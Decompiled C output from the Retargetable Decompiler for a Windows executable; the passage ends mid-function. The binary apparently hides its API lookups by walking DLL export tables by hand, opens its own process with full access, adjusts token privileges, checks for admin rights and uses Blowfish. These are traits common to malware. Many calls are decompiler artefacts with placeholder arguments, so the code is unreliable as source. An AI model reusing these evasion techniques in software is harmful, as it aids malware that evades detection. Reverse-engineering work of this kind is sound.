//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _OSVERSIONINFOW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int16_t e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct vtable_4172cc_type {
    int32_t (*e0)(char);
    int32_t (*e1)();
};

// ------------------------- Classes --------------------------

// .?AVBitmap@Gdiplus@@ (base classes: .?AVImage@Gdiplus@@, .?AVGdiplusBase@Gdiplus@@)
// .?AVGdiplusBase@Gdiplus@@
// .?AVImage@Gdiplus@@
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVexception@std@@
// .?AVtype_info@@
// Advapi32.dll

// ------------------- Function Prototypes --------------------

int32_t _40___security_check_cookie_40_4(void);
int32_t function_403aa0(char a1);
int32_t function_403cb0(void);
int32_t function_403d00(char a1);
int32_t function_4056c0(void);
int32_t function_405980(void);
int32_t function_405a60(void);
int32_t function_405db0(void);
int32_t function_405f10(int32_t a1);
int32_t function_4063d0(int32_t a1);
int32_t function_406890(int32_t * a1);
int32_t function_408e60(int32_t lpOut);
int32_t function_4090f0(void);
int32_t function_4099c0(int32_t * a1);
int32_t function_409b10(int32_t a1);
int32_t function_409bf0(int32_t a1);
int32_t function_409e00(void);
int32_t function_409ec0(int32_t a1);
int32_t function_40a0d0(int32_t * a1);
int32_t function_40a380(int32_t uFlags);
int32_t function_40a690(int32_t a1);
int32_t function_40aa00(void);
int32_t function_40aa50(void);
int32_t function_40b7bd(void);
int32_t function_40bc21(void);
int32_t function_40cb7c(void);

// --------------------- Global Variables ---------------------

// Detected cryptographic pattern: Blowfish_bfp_table (32-bit, little endian)
int32_t Blowfish_bfp_table_at_4192b0[18] = {0x243f6a88, -0x7a5cf72d, 0x13198a2e, 0x3707344, -0x5bf6c7de, 0x299f31d0, 0x82efa98, -0x13b19377, 0x452821e6, 0x38d01377, -0x41ab9931, 0x34e90c6c, -0x3f53d649, -0x3683af23, 0x3f84d5b5, -0x4ab8f6e9, -0x6de92a27, -0x768604e5}; // 0x4192b0
int32_t g2 = 46; // 0x41c54c
int32_t g3 = 0x403d00; // 0x41c624
int32_t g4 = -0x44bf19b2; // 0x41e024
char * g5; // 0x4210d0
int32_t g6 = 0; // 0x4210d4
int32_t g7 = 0; // 0x4210d8
int32_t g8 = 0; // 0x4210dc
int32_t g9 = 0; // 0x4211e0
int32_t g10 = 0; // 0x4211e4
int32_t g11 = 0; // 0x4212ec
int32_t g12 = 0; // 0x422c24
int32_t g13 = 0; // 0x422d2c
int32_t g14;
struct vtable_4172cc_type g1 = {
    .e0 = function_403aa0,
    .e1 = function_40b7bd
}; // 0x4172cc

// ------------------------ Functions -------------------------

// Address range: 0x403aa0 - 0x403ac7
// From class:    .?AVbad_alloc@std@@
// Type:          constructor
int32_t function_403aa0(char a1) {
    // 0x403aa0
    int32_t result; // 0x403aa0
    *(int32_t *)result = (int32_t)&g1;
    _3f__Tidy_40_exception_40_std_40__40_AAEXXZ();
    return result;
}

// Address range: 0x403cb0 - 0x403cfd
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_403cb0(void) {
    int32_t v1 = 0; // bp-8, 0x403cbf
    int32_t v2; // 0x403cb0
    int32_t v3 = GdipCloneImage((int32_t *)*(int32_t *)(v2 + 4), (int32_t **)&v1); // 0x403cc6
    if (v3 != 0) {
        // 0x403cd0
        *(int32_t *)(v2 + 8) = v3;
    }
    int32_t * v4 = GdipAlloc(16); // 0x403cd5
    if (v4 == NULL) {
        // 0x403cf6
        return 0;
    }
    int32_t result = (int32_t)v4; // 0x403cd5
    *(int32_t *)(result + 8) = *(int32_t *)(v2 + 8);
    *v4 = (int32_t)&g3;
    *(int32_t *)(result + 4) = v1;
    return result;
}

// Address range: 0x403d00 - 0x403d2a
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_403d00(char a1) {
    // 0x403d00
    int32_t result; // 0x403d00
    int32_t * v1 = (int32_t *)result; // 0x403d0a
    *v1 = (int32_t)&g3;
    GdipDisposeImage((int32_t *)*(int32_t *)(result + 4));
    if ((a1 & 1) != 0) {
        // 0x403d1c
        GdipFree(v1);
    }
    // 0x403d23
    return result;
}

// Address range: 0x4056c0 - 0x405976
int32_t function_4056c0(void) {
    char lpBuffer = 0; // bp-128, 0x4056de
    int32_t v1; // bp-127, 0x4056c0
    _memset(&v1, 0, 44);
    char lpFileName = 0; // bp-180, 0x4056fc
    int32_t v2; // bp-179, 0x4056c0
    _memset(&v2, 0, 49);
    int32_t v3 = 0x35545039; // bp-20, 0x405716
    int32_t v4 = &v3; // 0x405736
    int32_t v5 = v4; // 0x40573b
    while (*(char *)v5 != 0) {
        // 0x405740
        v5++;
    }
    // 0x405747
    int32_t v6; // bp-181, 0x4056c0
    int32_t v7 = &v6; // 0x405751
    v7++;
    char * v8 = (char *)v7;
    while (*v8 != 0) {
        // 0x405752
        v7++;
        v8 = (char *)v7;
    }
    uint32_t v9 = v5 - v4; // 0x40574d
    uint32_t v10 = v9 / 4; // 0x40575c
    __asm_rep_movsd_memcpy(v8, (char *)&v3, v10);
    bool v11; // 0x4056c0
    int32_t v12 = v11 ? -4 : 4; // 0x40575f
    char * v13 = (char *)(v7 + v10 * v12); // 0x40577e
    __asm_rep_movsb_memcpy(v13, v13, v9 & 3);
    int32_t * fileHandle = CreateFileA(&lpFileName, (int32_t)&g14, (int32_t)&g14, (struct _SECURITY_ATTRIBUTES *)&g14, (int32_t)&g14, (int32_t)&g14, &g14); // 0x405787
    int32_t lpNumberOfBytesRead; // bp-312, 0x4056c0
    if (fileHandle != (int32_t *)-1) {
        // 0x405947
        ReadFile(fileHandle, (int32_t *)&lpBuffer, 40, &lpNumberOfBytesRead, NULL);
        // 0x40595c
        CloseHandle(&g14);
        return _40___security_check_cookie_40_4();
    }
    int32_t * fileHandle2 = CreateFileA(&lpFileName, 4, 1, NULL, 2, 128, NULL); // 0x4057aa
    int32_t v14; // bp-79, 0x4056c0
    _memset(&v14, 0, 49);
    int16_t v15 = 0x6547; // bp-80, 0x4057c7
    char * v16 = "Advapi32.dll"; // bp-400, 0x4057fe
    int32_t v17 = (int32_t)&v16; // 0x4057fe
    int32_t moduleHandle = (int32_t)GetModuleHandleA("Advapi32.dll"); // 0x405803
    int32_t v18 = *(int32_t *)(*(int32_t *)(moduleHandle + 60) + 120 + moduleHandle) + moduleHandle;
    int32_t v19 = *(int32_t *)(v18 + 24) - 1; // 0x40581e
    int32_t v20 = v17; // 0x405825
    if (v19 >= 0) {
        int32_t v21 = *(int32_t *)(v18 + 32) + moduleHandle; // 0x40581c
        int32_t v22 = v19; // 0x40584a
        int32_t v23 = v17; // 0x40583f
        *(int32_t *)(v23 - 4) = (int32_t)&v15;
        v23 -= 8;
        *(int32_t *)v23 = *(int32_t *)(v21 + 4 * v22) + moduleHandle;
        int32_t v24 = lstrcmpA((char *)&g14, (char *)&g14); // 0x405840
        v20 = v23;
        while (v24 != 0) {
            // 0x40584a
            v22--;
            v20 = v23;
            if (v22 < 0) {
                // break -> 0x405850
                break;
            }
            *(int32_t *)(v23 - 4) = (int32_t)&v15;
            v23 -= 8;
            *(int32_t *)v23 = *(int32_t *)(v21 + 4 * v22) + moduleHandle;
            v24 = lstrcmpA((char *)&g14, (char *)&g14);
            v20 = v23;
        }
    }
    int32_t v25 = (int32_t)fileHandle2; // 0x4057aa
    int32_t v26; // bp-304, 0x4056c0
    *(int32_t *)(v20 - 4) = (int32_t)&v26;
    int32_t v27; // bp-300, 0x4056c0
    int32_t v28 = &v27; // 0x405879
    while (*(char *)v28 != 0) {
        // 0x405880
        v28++;
    }
    // 0x405887
    int32_t v29; // bp-299, 0x4056c0
    int32_t v30 = v28 - (int32_t)&v29; // 0x405887
    if (v30 != 0) {
        int32_t v31 = 0;
        int32_t v32; // bp-4, 0x4056c0
        int32_t v33; // 0x4056c0
        if (v31 != 0 && v31 != v30 - 1) {
            // 0x40589b
            v33 = v31 + (int32_t)&v32;
            *(char *)(v33 - 125) = *(char *)(v33 - 296);
        }
        int32_t v34 = v31 + 1; // 0x4058a6
        while (v34 != v30) {
            // 0x405890
            v31 = v34;
            if (v31 != 0 && v31 != v30 - 1) {
                // 0x40589b
                v33 = v31 + (int32_t)&v32;
                *(char *)(v33 - 125) = *(char *)(v33 - 296);
            }
            // 0x4058a6
            v34 = v31 + 1;
        }
    }
    int32_t v35 = GetTickCount(); // 0x4058ab
    int32_t * v36 = (int32_t *)(v20 - 8); // 0x4058b1
    *v36 = v35;
    _srand((int32_t)&g14);
    int32_t v37 = _rand(); // 0x4058b7
    int32_t * v38 = (int32_t *)(v20 - 12); // 0x4058c4
    *v38 = 16;
    int32_t * v39 = (int32_t *)(v20 - 16); // 0x4058c9
    int32_t v40; // bp-28, 0x4056c0
    int32_t v41 = &v40; // 0x4058c9
    *v39 = v41;
    v40 = 0;
    int32_t * v42 = (int32_t *)(v20 - 20); // 0x4058db
    *v42 = (int32_t)((0x100000000 * (int64_t)(v37 >> 31) | (int64_t)v37) % 0xc350) + 0x2710;
    __itoa(v40, NULL, (int32_t)&g14);
    int32_t v43 = v41; // 0x4058e9
    while (*(char *)v43 != 0) {
        // 0x4058f0
        v43++;
    }
    // 0x4058f7
    int32_t v44; // bp-129, 0x4056c0
    int32_t v45 = &v44; // 0x4058ff
    v45++;
    char * v46 = (char *)v45;
    while (*v46 != 0) {
        // 0x405900
        v45++;
        v46 = (char *)v45;
    }
    uint32_t v47 = v43 - v41; // 0x4058fa
    uint32_t v48 = v47 / 4; // 0x40590a
    __asm_rep_movsd_memcpy(v46, (char *)&v40, v48);
    int32_t v49 = &lpBuffer; // 0x405914
    char * v50 = (char *)(v45 + v48 * v12); // 0x405917
    __asm_rep_movsb_memcpy(v50, v50, v47 & 3);
    int32_t v51 = v49; // 0x40591c
    while (*(char *)v51 != 0) {
        // 0x405920
        v51++;
    }
    // 0x405927
    *v36 = 0;
    *v38 = (int32_t)&lpNumberOfBytesRead;
    *v39 = v51 - (int32_t)&v1;
    *v42 = v49;
    *(int32_t *)(v20 - 24) = v25;
    WriteFile(&g14, &g14, (int32_t)&g14, &g14, (struct _OVERLAPPED *)&g14);
    *(int32_t *)(v20 - 28) = v25;
    // 0x40595c
    CloseHandle(&g14);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x405980 - 0x405a60
int32_t function_405980(void) {
    char * v1 = "kernel32.dll"; // bp-252, 0x40599a
    int32_t v2 = (int32_t)&v1; // 0x40599a
    int32_t v3 = 200; // bp-232, 0x40599f
    int32_t moduleHandle = (int32_t)GetModuleHandleA("kernel32.dll"); // 0x4059bf
    char v4 = 71; // bp-28, 0x4059ca
    int32_t v5 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle;
    int32_t v6 = *(int32_t *)(v5 + 32); // 0x4059ed
    int32_t v7 = *(int32_t *)(v5 + 24) - 1; // 0x4059f9
    int32_t v8; // bp-228, 0x405980
    if (v7 < 0) {
        // 0x405a24
        *(int32_t *)(v2 - 4) = (int32_t)&v3;
        *(int32_t *)(v2 - 8) = (int32_t)&v8;
        return _40___security_check_cookie_40_4();
    }
    int32_t v9 = v7; // 0x405a1e
    int32_t v10 = v2; // 0x405a13
    *(int32_t *)(v10 - 4) = (int32_t)&v4;
    v10 -= 8;
    *(int32_t *)v10 = *(int32_t *)(v6 + moduleHandle + 4 * v9) + moduleHandle;
    while (lstrcmpA((char *)&g14, (char *)&g14) != 0) {
        // 0x405a1e
        v9--;
        if (v9 < 0) {
            // break -> 0x405a24
            break;
        }
        *(int32_t *)(v10 - 4) = (int32_t)&v4;
        v10 -= 8;
        *(int32_t *)v10 = *(int32_t *)(v6 + moduleHandle + 4 * v9) + moduleHandle;
    }
    // 0x405a24
    *(int32_t *)(v10 - 4) = (int32_t)&v3;
    *(int32_t *)(v10 - 8) = (int32_t)&v8;
    return _40___security_check_cookie_40_4();
}

// Address range: 0x405a60 - 0x405da1
int32_t function_405a60(void) {
    char v1 = 0; // bp-228, 0x405a84
    int32_t v2; // bp-227, 0x405a60
    _memset(&v2, 0, 199);
    char * v3 = "Advapi32.dll"; // bp-268, 0x405a95
    int32_t v4 = (int32_t)&v3; // 0x405a95
    int32_t v5 = 200; // bp-244, 0x405a9a
    char v6 = 71; // bp-28, 0x405ac3
    int32_t v7 = *(int32_t *)(*(int32_t *)60 + 120); // 0x405adf
    int32_t v8 = *(int32_t *)(v7 + 24) - 1; // 0x405aef
    int32_t v9 = v4; // 0x405af6
    if (v8 >= 0) {
        int32_t v10 = v8; // 0x405b1a
        int32_t v11 = v4; // 0x405b0f
        *(int32_t *)(v11 - 4) = (int32_t)&v6;
        v11 -= 8;
        *(int32_t *)v11 = *(int32_t *)(4 * v10 + *(int32_t *)(v7 + 32));
        int32_t v12 = lstrcmpA((char *)&g14, (char *)&g14); // 0x405b10
        v9 = v11;
        while (v12 != 0) {
            // 0x405b1a
            v10--;
            v9 = v11;
            if (v10 < 0) {
                // break -> 0x405b20
                break;
            }
            *(int32_t *)(v11 - 4) = (int32_t)&v6;
            v11 -= 8;
            *(int32_t *)v11 = *(int32_t *)(4 * v10 + *(int32_t *)(v7 + 32));
            v12 = lstrcmpA((char *)&g14, (char *)&g14);
            v9 = v11;
        }
    }
    // 0x405b20
    *(int32_t *)(v9 - 4) = (int32_t)&v5;
    *(int32_t *)(v9 - 8) = (int32_t)&v1;
    *(int32_t *)(v9 - 12) = GetCurrentProcessId();
    *(int32_t *)(v9 - 16) = 0;
    *(int32_t *)(v9 - 20) = 0x1fffff;
    int32_t * lpModuleName = OpenProcess((int32_t)&g14, (bool)&g14, (int32_t)&g14); // 0x405b53
    *(int32_t *)(v9 - 24) = (int32_t)"Advapi32.dll";
    int32_t v13 = v9 - 28; // 0x405b6a
    *(int32_t *)v13 = (int32_t)"Advapi32.dll";
    int32_t moduleHandle = (int32_t)GetModuleHandleA((char *)lpModuleName); // 0x405b6f
    v6 = 79;
    int32_t * v14 = (int32_t *)(moduleHandle + 60); // 0x405b97
    int32_t v15 = moduleHandle + 120;
    int32_t v16 = *(int32_t *)(v15 + *v14); // 0x405b9a
    int32_t v17 = moduleHandle + 32;
    int32_t v18 = moduleHandle + 24;
    int32_t v19 = *(int32_t *)(v16 + v18) - 1; // 0x405baa
    int32_t v20 = v13; // 0x405bb1
    if (v19 >= 0) {
        int32_t v21 = *(int32_t *)(v16 + v17) + moduleHandle; // 0x405ba8
        int32_t v22 = v19; // 0x405bda
        int32_t v23 = v13; // 0x405bcf
        *(int32_t *)(v23 - 4) = (int32_t)&v6;
        v23 -= 8;
        *(int32_t *)v23 = *(int32_t *)(v21 + 4 * v22) + moduleHandle;
        int32_t v24 = lstrcmpA((char *)&g14, (char *)&g14); // 0x405bd0
        v20 = v23;
        while (v24 != 0) {
            // 0x405bda
            v22--;
            v20 = v23;
            if (v22 < 0) {
                // break -> 0x405be0
                break;
            }
            *(int32_t *)(v23 - 4) = (int32_t)&v6;
            v23 -= 8;
            *(int32_t *)v23 = *(int32_t *)(v21 + 4 * v22) + moduleHandle;
            v24 = lstrcmpA((char *)&g14, (char *)&g14);
            v20 = v23;
        }
    }
    // 0x405be0
    int32_t v25; // bp-240, 0x405a60
    *(int32_t *)(v20 - 4) = (int32_t)&v25;
    *(int32_t *)(v20 - 8) = 0x20008;
    int32_t v26 = v20 - 12; // 0x405bfb
    *(int32_t *)v26 = (int32_t)lpModuleName;
    v6 = 71;
    int32_t v27 = *(int32_t *)(*v14 + v15); // 0x405c30
    int32_t v28 = *(int32_t *)(v27 + v18) - 1; // 0x405c40
    int32_t v29 = v26; // 0x405c47
    if (v28 >= 0) {
        int32_t v30 = *(int32_t *)(v27 + v17) + moduleHandle; // 0x405c3e
        int32_t v31 = v28; // 0x405c6a
        int32_t v32 = v26; // 0x405c5f
        *(int32_t *)(v32 - 4) = (int32_t)&v6;
        v32 -= 8;
        *(int32_t *)v32 = *(int32_t *)(v30 + 4 * v31) + moduleHandle;
        int32_t v33 = lstrcmpA((char *)&g14, (char *)&g14); // 0x405c60
        v29 = v32;
        while (v33 != 0) {
            // 0x405c6a
            v31--;
            v29 = v32;
            if (v31 < 0) {
                // break -> 0x405c70
                break;
            }
            *(int32_t *)(v32 - 4) = (int32_t)&v6;
            v32 -= 8;
            *(int32_t *)v32 = *(int32_t *)(v30 + 4 * v31) + moduleHandle;
            v33 = lstrcmpA((char *)&g14, (char *)&g14);
            v29 = v32;
        }
    }
    // 0x405c70
    int32_t v34; // bp-252, 0x405a60
    *(int32_t *)(v29 - 4) = (int32_t)&v34;
    *(int32_t *)(v29 - 8) = 4;
    int32_t v35; // bp-248, 0x405a60
    *(int32_t *)(v29 - 12) = (int32_t)&v35;
    *(int32_t *)(v29 - 16) = 20;
    *(int32_t *)(v29 - 20) = v25;
    int32_t * v36 = (int32_t *)(v29 - 24);
    if (v35 != 0) {
        // 0x405ca9
        *v36 = (int32_t)"ok";
        _printf((char *)&g14);
    }
    // 0x405cb6
    *v36 = (int32_t)L"shell32.dll";
    LoadLibraryW((int16_t *)&g14);
    int32_t v37 = v29 - 28; // 0x405cc1
    *(int32_t *)v37 = (int32_t)L"shell32.dll";
    int32_t v38 = (int32_t)GetModuleHandleW((int16_t *)&g14); // 0x405cc6
    v6 = 73;
    int32_t v39 = *(int32_t *)(v38 + 120 + *(int32_t *)(v38 + 60)) + v38;
    int32_t v40 = *(int32_t *)(v39 + 24) - 1; // 0x405cfc
    int32_t v41 = -1; // 0x405d03
    int32_t v42 = v37; // 0x405d03
    if (v40 >= 0) {
        int32_t v43 = *(int32_t *)(v39 + 32) + v38; // 0x405cfa
        int32_t v44 = v40; // 0x405d2a
        int32_t v45 = v37; // 0x405d1f
        *(int32_t *)(v45 - 4) = (int32_t)&v6;
        v45 -= 8;
        *(int32_t *)v45 = *(int32_t *)(v43 + 4 * v44) + v38;
        int32_t v46 = lstrcmpA((char *)&g14, (char *)&g14); // 0x405d20
        v41 = v44;
        v42 = v45;
        while (v46 != 0) {
            // 0x405d2a
            v44--;
            v41 = -1;
            v42 = v45;
            if (v44 < 0) {
                // break -> 0x405d30
                break;
            }
            *(int32_t *)(v45 - 4) = (int32_t)&v6;
            v45 -= 8;
            *(int32_t *)v45 = *(int32_t *)(v43 + 4 * v44) + v38;
            v46 = lstrcmpA((char *)&g14, (char *)&g14);
            v41 = v44;
            v42 = v45;
        }
    }
    uint16_t v47 = *(int16_t *)(2 * v41 + v38 + *(int32_t *)(v39 + 36)); // 0x405d36
    int32_t v48 = *(int32_t *)(*(int32_t *)(v39 + 28) + v38 + 4 * (int32_t)v47); // 0x405d40
    int32_t v49; // bp-229, 0x405a60
    if (v48 == -v38) {
        int32_t v50 = &v49; // 0x405d84
        while (*(char *)(v50 + 1) != 0) {
            // 0x405d85
            v50++;
        }
        // 0x405d8d
        return _40___security_check_cookie_40_4();
    }
    // 0x405d4e
    *(int32_t *)(v42 + 8) = (int32_t)"user is admin";
    _printf((char *)&g14);
    int32_t v51 = &v49; // 0x405d61
    while (*(char *)(v51 + 1) != 0) {
        // 0x405d62
        v51++;
    }
    // 0x405d6a
    return _40___security_check_cookie_40_4();
}

// Address range: 0x405db0 - 0x405f0a
int32_t function_405db0(void) {
    char v1 = 0; // bp-16, 0x405dea
    int32_t v2; // bp-328, 0x405db0
    _memset(&v2, 0, 272);
    int32_t lpVersionInformation = 276; // bp-332, 0x405dff
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x405e1f
    char lpProcName = 71; // bp-36, 0x405e2a
    GetProcAddress(moduleHandle, &lpProcName);
    GetVersionExW((struct _OSVERSIONINFOW *)&lpVersionInformation);
    __itoa(v2, &v1, 10);
    int32_t v3 = &v1; // 0x405e6e
    int32_t v4 = v3; // 0x405e74
    while (*(char *)v4 != 0) {
        // 0x405e76
        v4++;
    }
    // 0x405e7d
    int32_t v5; // bp-57, 0x405db0
    int32_t v6 = &v5; // 0x405e84
    int32_t v7 = v6; // 0x405e84
    v7++;
    char * v8 = (char *)v7;
    while (*v8 != 0) {
        // 0x405e85
        v7++;
        v8 = (char *)v7;
    }
    uint32_t v9 = v4 - v3; // 0x405e80
    uint32_t v10 = v9 / 4; // 0x405e8f
    __asm_rep_movsd_memcpy(v8, &v1, v10);
    bool v11; // 0x405db0
    int32_t v12 = v11 ? -4 : 4; // 0x405e92
    char * v13 = (char *)(v7 + v10 * v12); // 0x405e99
    __asm_rep_movsb_memcpy(v13, v13, v9 & 3);
    int32_t v14 = v6; // 0x405e9f
    v14++;
    while (*(char *)v14 != 0) {
        // 0x405ea0
        v14++;
    }
    // 0x405ea8
    *(int32_t *)v14 = 0x76696d;
    int32_t v15; // 0x405db0
    __itoa(v15, &v1, 10);
    int32_t v16 = v3;
    int32_t v17 = v16 + 1; // 0x405ed2
    while (*(char *)v16 != 0) {
        // 0x405ed0
        v16 = v17;
        v17 = v16 + 1;
    }
    int32_t v18 = v6 + 1; // 0x405ee0
    char * v19 = (char *)v18;
    int32_t v20 = v18; // 0x405ee6
    while (*v19 != 0) {
        // 0x405ee0
        v18 = v20 + 1;
        v19 = (char *)v18;
        v20 = v18;
    }
    uint32_t v21 = v17 - v3; // 0x405eda
    uint32_t v22 = v21 / 4; // 0x405eea
    __asm_rep_movsd_memcpy(v19, &v1, v22);
    char * v23 = (char *)(v18 + v22 * v12); // 0x405ef4
    __asm_rep_movsb_memcpy(v23, v23, v21 & 3);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x405f10 - 0x4063c7
int32_t function_405f10(int32_t a1) {
    unsigned char v1 = *(char *)a1; // 0x405f18
    unsigned char v2 = *(char *)(a1 + 1); // 0x405f1b
    unsigned char v3 = *(char *)(a1 + 2); // 0x405f24
    unsigned char v4 = *(char *)(a1 + 3); // 0x405f2d
    int32_t v5; // 0x405f10
    uint32_t v6 = (256 * (256 * (256 * (int32_t)v1 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x405f36
    int32_t v7 = v5 + 1096; // 0x405f43
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x405f43
    int32_t v9 = v5 + 72; // 0x405f4f
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x405f4f
    int32_t v11 = v5 + 2120; // 0x405f5e
    int32_t v12 = *(int32_t *)((v6 / 64 & 1020) + v11); // 0x405f5e
    int32_t v13 = v5 + 3144; // 0x405f6d
    int32_t v14 = *(int32_t *)((4 * v6 & 1020) + v13); // 0x405f6d
    unsigned char v15 = *(char *)(a1 + 4); // 0x405f74
    unsigned char v16 = *(char *)(a1 + 5); // 0x405f78
    unsigned char v17 = *(char *)(a1 + 6); // 0x405f84
    unsigned char v18 = *(char *)(a1 + 7); // 0x405f90
    int32_t v19 = *(int32_t *)(v5 + 4); // 0x405f99
    uint32_t v20 = v19 ^ (v10 + v8 ^ v12) + v14 ^ (256 * (256 * (256 * (int32_t)v15 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x405f9e
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x405fb7
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v11); // 0x405fc6
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v13); // 0x405fd5
    int32_t v24 = *(int32_t *)(v5 + 8); // 0x405fdc
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x405fe1
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x405ffa
    int32_t v27 = *(int32_t *)((v25 / 64 & 1020) + v11); // 0x406009
    int32_t v28 = *(int32_t *)((4 * v25 & 1020) + v13); // 0x406018
    int32_t v29 = *(int32_t *)(v5 + 12); // 0x40601f
    uint32_t v30 = (v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7) ^ v27) + v28 ^ v20 ^ v29; // 0x406024
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x40603d
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v11); // 0x40604c
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v13); // 0x40605b
    int32_t v34 = *(int32_t *)(v5 + 16); // 0x406062
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x406067
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x406080
    int32_t v37 = *(int32_t *)((v35 / 64 & 1020) + v11); // 0x40608f
    int32_t v38 = *(int32_t *)((4 * v35 & 1020) + v13); // 0x40609e
    int32_t v39 = *(int32_t *)(v5 + 20); // 0x4060a7
    uint32_t v40 = (v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7) ^ v37) + v38 ^ v30 ^ v39; // 0x4060aa
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x4060c3
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v11); // 0x4060d2
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v13); // 0x4060e1
    int32_t v44 = *(int32_t *)(v5 + 24); // 0x4060ea
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x4060ed
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406106
    int32_t v47 = *(int32_t *)((v45 / 64 & 1020) + v11); // 0x406115
    int32_t v48 = *(int32_t *)((4 * v45 & 1020) + v13); // 0x406124
    int32_t v49 = *(int32_t *)(v5 + 28); // 0x40612d
    uint32_t v50 = (v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7) ^ v47) + v48 ^ v40 ^ v49; // 0x406130
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x406149
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v11); // 0x406158
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v13); // 0x406167
    int32_t v54 = *(int32_t *)(v5 + 32); // 0x406170
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406173
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x40618c
    int32_t v57 = *(int32_t *)((v55 / 64 & 1020) + v11); // 0x40619b
    int32_t v58 = *(int32_t *)((4 * v55 & 1020) + v13); // 0x4061aa
    int32_t v59 = *(int32_t *)(v5 + 36); // 0x4061b3
    uint32_t v60 = (v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7) ^ v57) + v58 ^ v50 ^ v59; // 0x4061b6
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x4061cf
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v11); // 0x4061de
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v13); // 0x4061ed
    int32_t v64 = *(int32_t *)(v5 + 40); // 0x4061f6
    uint32_t v65 = (v61 + *(int32_t *)((v60 / 0x4000 & 1020) + v7) ^ v62) + v63 ^ v55 ^ v64; // 0x4061f9
    int32_t v66 = *(int32_t *)(4 * v65 / 0x1000000 + v9); // 0x406212
    int32_t v67 = *(int32_t *)((v65 / 64 & 1020) + v11); // 0x406221
    int32_t v68 = *(int32_t *)((4 * v65 & 1020) + v13); // 0x406230
    int32_t v69 = *(int32_t *)(v5 + 44); // 0x406239
    uint32_t v70 = (v66 + *(int32_t *)((v65 / 0x4000 & 1020) + v7) ^ v67) + v68 ^ v60 ^ v69; // 0x40623c
    int32_t v71 = *(int32_t *)(4 * v70 / 0x1000000 + v9); // 0x406255
    int32_t v72 = *(int32_t *)((v70 / 64 & 1020) + v11); // 0x406264
    int32_t v73 = *(int32_t *)((4 * v70 & 1020) + v13); // 0x406273
    int32_t v74 = *(int32_t *)(v5 + 48); // 0x40627c
    uint32_t v75 = (v71 + *(int32_t *)((v70 / 0x4000 & 1020) + v7) ^ v72) + v73 ^ v65 ^ v74; // 0x40627f
    int32_t v76 = *(int32_t *)(4 * v75 / 0x1000000 + v9); // 0x406298
    int32_t v77 = *(int32_t *)((v75 / 64 & 1020) + v11); // 0x4062a7
    int32_t v78 = *(int32_t *)((4 * v75 & 1020) + v13); // 0x4062b6
    int32_t v79 = *(int32_t *)(v5 + 52); // 0x4062bf
    uint32_t v80 = (v76 + *(int32_t *)((v75 / 0x4000 & 1020) + v7) ^ v77) + v78 ^ v70 ^ v79; // 0x4062c2
    int32_t v81 = *(int32_t *)(4 * v80 / 0x1000000 + v9); // 0x4062db
    int32_t v82 = *(int32_t *)((v80 / 64 & 1020) + v11); // 0x4062ea
